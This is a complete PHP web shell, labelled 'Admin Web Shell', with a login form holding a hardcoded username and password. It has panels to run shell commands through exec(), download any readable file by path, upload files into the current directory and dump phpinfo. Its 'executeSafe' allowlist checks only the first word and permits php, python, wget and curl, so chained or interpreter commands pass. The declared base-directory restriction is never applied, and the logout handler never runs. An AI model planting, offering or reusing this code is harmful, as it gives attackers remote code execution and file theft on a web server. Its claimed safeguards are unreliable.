<?php
session_start();
ob_start();

// ================= CONFIGURATION =================
$CONFIG = [
    'password' => 'Shuju@123', // CHANGE THIS PASSWORD
    'username' => 'shuju',    // CHANGE THIS USERNAME
    'session_timeout' => 3600, // 1 hour
    'allowed_commands' => ['ls', 'pwd', 'whoami', 'date', 'php', 'python', 'wget', 'curl'],
    'base_directory' => '/var/www/html' // Restrict to this directory
];
// =================================================

// Authentication check
function checkAuth() {
    global $CONFIG;
    
    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
        // Check session timeout
        if (time() - $_SESSION['login_time'] > $CONFIG['session_timeout']) {
            session_destroy();
            return false;
        }
        return true;
    }
    return false;
}

// Login form
if (!checkAuth()) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $CONFIG['username'] && $_POST['password'] === $CONFIG['password']) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['client_ip'] = $_SERVER['REMOTE_ADDR'];
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid credentials!";
        }
    }
    
    // Show login form
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Admin Shell - Login</title>
        <style>
            body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 0; padding: 20px; }
            .login-container { max-width: 400px; margin: 100px auto; background: #2d2d2d; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.3); }
            .form-group { margin-bottom: 20px; }
            label { display: block; margin-bottom: 5px; color: #ccc; }
            input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #444; border-radius: 5px; background: #1a1a1a; color: #fff; }
            input[type="submit"] { background: #007cba; color: white; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
            .error { color: #ff6b6b; background: #3a2525; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>🔐 Admin Shell Login</h2>
            '.(isset($error) ? '<div class="error">'.$error.'</div>' : '').'
            <form method="post">
                <div class="form-group">
                    <label>Username:</label>
                    <input type="text" name="username" required>
                </div>
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password" required>
                </div>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// Security functions
function sanitizeInput($input) {
    return htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
}

function isCommandAllowed($command) {
    global $CONFIG;
    $baseCmd = explode(' ', $command)[0];
    return in_array($baseCmd, $CONFIG['allowed_commands']);
}

function executeSafe($command) {
    if (!isCommandAllowed($command)) {
        return "Error: Command not allowed";
    }
    
    $output = [];
    $return_var = 0;
    exec($command . " 2>&1", $output, $return_var);
    return implode("\n", $output);
}

// Handle actions
$output = '';
$current_dir = getcwd();

if ($_POST) {
    if (isset($_POST['command'])) {
        $command = sanitizeInput($_POST['command']);
        $output = executeSafe($command);
    }
    
    elseif (isset($_POST['download'])) {
        $file = sanitizeInput($_POST['file_path']);
        if (file_exists($file) && is_readable($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        } else {
            $output = "Error: File not found or not readable";
        }
    }
    
    elseif (isset($_FILES['upload_file'])) {
        $upload_file = $_FILES['upload_file'];
        if ($upload_file['error'] === UPLOAD_ERR_OK) {
            $target_path = $current_dir . '/' . basename($upload_file['name']);
            if (move_uploaded_file($upload_file['tmp_name'], $target_path)) {
                $output = "File uploaded successfully: " . $upload_file['name'];
            } else {
                $output = "Error uploading file";
            }
        }
    }
}

// Main interface
?>
<!DOCTYPE html>
<html>
<head>
    <title>🔧 Admin Web Shell</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #2d2d2d; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .panel { background: #2d2d2d; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .output { background: #000; padding: 15px; border-radius: 5px; min-height: 200px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; }
        input, textarea, button, select { background: #1a1a1a; color: #00ff00; border: 1px solid #444; padding: 8px; border-radius: 3px; }
        button { cursor: pointer; }
        button:hover { background: #2a2a2a; }
        .form-group { margin-bottom: 15px; }
        .tabs { display: flex; margin-bottom: 10px; }
        .tab { padding: 10px 20px; background: #333; cursor: pointer; margin-right: 5px; border-radius: 3px 3px 0 0; }
        .tab.active { background: #444; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🔧 Admin Web Shell</h2>
            <div>User: <?php echo get_current_user(); ?> | Directory: <?php echo $current_dir; ?> | 
                 <a href="?logout=1" style="color: #ff6b6b;">Logout</a></div>
        </div>

        <div class="tabs">
            <div class="tab active" onclick="switchTab('command')">Command</div>
            <div class="tab" onclick="switchTab('filemanager')">File Manager</div>
            <div class="tab" onclick="switchTab('upload')">Upload</div>
            <div class="tab" onclick="switchTab('phpinfo')">PHP Info</div>
        </div>

        <!-- Command Tab -->
        <div id="command" class="tab-content active">
            <div class="panel">
                <h3>💻 Execute Command</h3>
                <form method="post">
                    <input type="text" name="command" placeholder="Enter command (ls, pwd, whoami, etc.)" style="width: 70%;">
                    <button type="submit">Execute</button>
                </form>
            </div>
        </div>

        <!-- File Manager Tab -->
        <div id="filemanager" class="tab-content">
            <div class="panel">
                <h3>📁 File Manager</h3>
                <form method="post">
                    <input type="text" name="file_path" placeholder="/path/to/file" style="width: 60%;">
                    <button type="submit" name="download">Download File</button>
                </form>
                <div style="margin-top: 15px;">
                    <h4>Current Directory Files:</h4>
                    <div class="output">
<?php
$files = scandir($current_dir);
foreach ($files as $file) {
    if ($file != '.' && $file != '..') {
        $type = is_dir($file) ? '📁' : '📄';
        $size = is_file($file) ? ' (' . number_format(filesize($file)) . ' bytes)' : '';
        echo $type . ' ' . $file . $size . "\n";
    }
}
?>
                    </div>
                </div>
            </div>
        </div>

        <!-- Upload Tab -->
        <div id="upload" class="tab-content">
            <div class="panel">
                <h3>⬆️ File Upload</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="upload_file">
                    <button type="submit">Upload File</button>
                </form>
            </div>
        </div>

        <!-- PHP Info Tab -->
        <div id="phpinfo" class="tab-content">
            <div class="panel">
                <h3>🐘 PHP Information</h3>
                <div class="output">
<?php
ob_start();
phpinfo();
$phpinfo = ob_get_clean();
echo $phpinfo;
?>
                </div>
            </div>
        </div>

        <!-- Output Display -->
        <?php if (!empty($output)): ?>
        <div class="panel">
            <h3>📋 Output:</h3>
            <div class="output"><?php echo sanitizeInput($output); ?></div>
        </div>
        <?php endif; ?>
    </div>

    <script>
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }
    </script>
</body>
</html>
<?php
// Logout handler
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
?>
